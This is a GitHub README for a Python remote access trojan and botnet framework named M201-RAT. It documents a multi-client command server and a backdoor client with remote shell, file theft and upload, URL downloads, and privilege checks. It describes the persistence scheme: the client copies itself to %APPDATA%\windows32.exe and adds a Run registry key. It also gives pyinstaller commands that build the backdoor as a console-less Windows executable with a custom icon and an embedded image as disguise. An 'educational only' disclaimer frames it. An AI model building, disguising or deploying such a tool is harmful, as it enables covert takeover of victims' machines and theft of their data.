# M201-RAT

<p align="center">
  <img src="https://github.com/CrypterENC/M201-RAT/blob/main/rsrc/thumbnail.png" alt="Reverse Shell Demo" style="width: 400px; height: 250px; object-fit: cover; object-position: center;">
</p>

```
  ██████ ▄▄▄█████▓ ▒█████   ▒█████   ██▓     ██▓    
▒██    ▒ ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▓██▒    
░ ▓██▄   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ▒██░    
  ▒   ██▒░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░    ▒██░    
▒██████▒▒  ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒░██████▒
▒ ▒▓▒ ▒ ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░
░ ░▒  ░ ░    ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░
░  ░  ░    ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░     ░ ░   
      ░               ░ ░      ░ ░      ░  ░    ░  ░
```

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.x-blue.svg">
  <img src="https://img.shields.io/badge/License-MIT-green.svg">
  <img src="https://img.shields.io/badge/Category-Offensive%20Security-red.svg">
</p>



**Advanced Remote Access Tool (RAT) with Multi-Client Botnet Capabilities**

## ⚠️ IMPORTANT DISCLAIMER

**THIS PROJECT IS FOR EDUCATIONAL PURPOSES ONLY**

This software is designed for cybersecurity education, penetration testing, and security research. The authors and contributors are not responsible for any misuse of this software. Users must comply with all applicable laws and regulations in their jurisdiction.

**DO NOT USE THIS SOFTWARE FOR:**
- Unauthorized access to computer systems
- Malicious activities
- Illegal purposes
- Attacking systems you do not own or have explicit permission to test

## 📋 Project Overview

M201-RAT is a sophisticated remote access tool (RAT) and botnet framework written in Python. It demonstrates advanced networking concepts, multi-client management, and remote system administration capabilities. The project includes both single-client and multi-client server implementations with a feature-rich backdoor client.

## ✨ Features

### Multi-Client Server (`threaded_server.py`)
- **Multi-threaded architecture** for handling multiple simultaneous connections
- **Interactive menu system** with colorized output using Colorama
- **Client management** - List, select, and interact with connected clients
- **Real-time connection monitoring** with automatic client detection
- **Enhanced UI** with ASCII art banner and clear screen functionality
- **Graceful server shutdown** and connection management

### Single-Client Server (`server.py`)
- **Basic RAT server** for single client connections
- **Simple menu interface** for server control
- **File transfer capabilities** (upload/download)
- **Remote command execution**

### Backdoor Client (`reverse.py`)
- **Persistent connection** with automatic reconnection
- **Administrator privilege detection**
- **Registry persistence** for Windows systems
- **File operations** (upload, download, execute)
- **Remote command execution** with shell access
- **URL-based file downloading**
- **Directory navigation** and system information gathering

## 🛠️ Installation

### Prerequisites
```bash
pip install colorama requests
```

### Required Python Packages
- `socket` (built-in)
- `json` (built-in)
- `threading` (built-in)
- `subprocess` (built-in)
- `os` (built-in)
- `sys` (built-in)
- `base64` (built-in)
- `argparse` (built-in)
- `colorama` (external)
- `requests` (external)
- `winreg` (Windows only, built-in)

### Setup
1. Clone the repository:
```bash
git clone https://github.com/yourusername/M201-InternetWorm.git
cd M201-RAT
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

### Wine Installation (For Windows Executable Creation on Linux)
For creating Windows executables on Kali Linux, you'll need Wine. See our comprehensive [Wine Setup Guide](WINE_SETUP.md) for complete installation and configuration instructions.

## 🚀 Usage

### Multi-Client Server
```bash
python threaded_server.py <IP_ADDRESS> <PORT>
```

**Example:**
```bash
python threaded_server.py 192.168.1.100 4444
```

**Menu Options:**
1. **Start Multi-Client Server** - Begin listening for client connections
2. **List Connected Clients** - Display all active connections
3. **Select Client** - Choose a client for interaction
4. **Stop Server** - Gracefully shutdown the server
5. **Clear Screen** - Clear terminal while preserving menu
6. **Exit** - Terminate the application

### Single-Client Server
```bash
python server.py <IP_ADDRESS> <PORT>
```

**Example:**
```bash
python server.py 192.168.1.100 1234
```

### Client/Backdoor
```bash
python reverse.py
```

**Note:** Modify the IP and port in `reverse.py` (line 162) to match your server configuration.

### Creating Windows Executable (Using Wine on Linux)

**Basic executable creation:**
```bash
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe --onefile --noconsole reverse.py
```

**Advanced executable with embedded files and custom icon:**
```bash
wine /root/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python313/Scripts/pyinstaller.exe --add-data="/home/kali/Desktop/Offensive hacking/Advanced_Botnet/{image_name.jpg}:." --onefile --noconsole --icon "/home/kali/Desktop/Offensive hacking/Advanced_Botnet/extract_icons/{icon_name.ico}" reverse.py
```

**Note:** For complete Wine setup instructions, see [WINE_SETUP.md](WINE_SETUP.md)

## 📁 File Descriptions

### `threaded_server.py`
The advanced multi-client server implementation featuring:
- Thread-based client handling
- Interactive client selection and management
- Enhanced user interface with colorized output
- Robust error handling and connection management
- File transfer capabilities (upload/download)
- Remote shell access for selected clients

### `server.py`
Basic single-client server implementation with:
- Simple client-server architecture
- Basic menu system
- File transfer functionality
- Remote command execution
- Colorized terminal output

### `reverse.py`
Sophisticated backdoor client featuring:
- Automatic server connection with retry logic
- Windows registry persistence mechanism
- Administrator privilege detection
- Comprehensive command handling:
  - `download [filename]` - Download files from target
  - `upload [filename]` - Upload files to target
  - `get [url]` - Download files from URLs
  - `check` - Check administrator privileges
  - `start [program]` - Execute programs
  - `cd [directory]` - Change directories
  - `client_help` - Display available commands

## 🔧 Advanced Features

### Persistence Mechanism
The backdoor client implements Windows persistence by:
- Copying itself to `%APPDATA%\windows32.exe`
- Creating registry entries in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`
- Automatic startup on system boot

### Multi-Client Management
The threaded server can handle multiple simultaneous connections:
- Each client runs in a separate thread
- Real-time client status monitoring
- Individual client selection for interaction
- Concurrent file operations

### Security Features
- Base64 encoding for file transfers
- JSON-based command protocol
- Error handling and graceful degradation
- Connection timeout management

## 🔒 Security Considerations

### For Researchers and Educators:
- Always use in isolated environments (VMs, test networks)
- Ensure proper authorization before testing
- Document all testing activities
- Follow responsible disclosure practices

### For System Administrators:
- This tool can help identify security vulnerabilities
- Use for authorized penetration testing only
- Implement proper network monitoring to detect similar tools
- Regular security audits and updates

## 📚 Educational Value

This project demonstrates:
- **Network Programming** - Socket programming, client-server architecture
- **Multi-threading** - Concurrent connection handling
- **System Administration** - Remote command execution, file operations
- **Windows Internals** - Registry manipulation, privilege escalation detection
- **Cybersecurity Concepts** - RAT functionality, persistence mechanisms
- **Python Development** - Advanced Python programming techniques

## 🤝 Contributing

Contributions are welcome for educational improvements:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

Please ensure all contributions maintain the educational focus and include appropriate security warnings.

## 📄 License

This project is released under the MIT License. See LICENSE file for details.

## 👨‍💻 Author

**Created by iDOR**
- For educational and research purposes
- Cybersecurity demonstration tool
- Advanced networking concepts

## 🔗 Related Resources

- [Python Socket Programming](https://docs.python.org/3/library/socket.html)
- [Threading in Python](https://docs.python.org/3/library/threading.html)
- [Windows Registry Programming](https://docs.python.org/3/library/winreg.html)
- [Cybersecurity Best Practices](https://www.nist.gov/cybersecurity)

---

**Remember: With great power comes great responsibility. Use this knowledge to build better security, not to break it.**
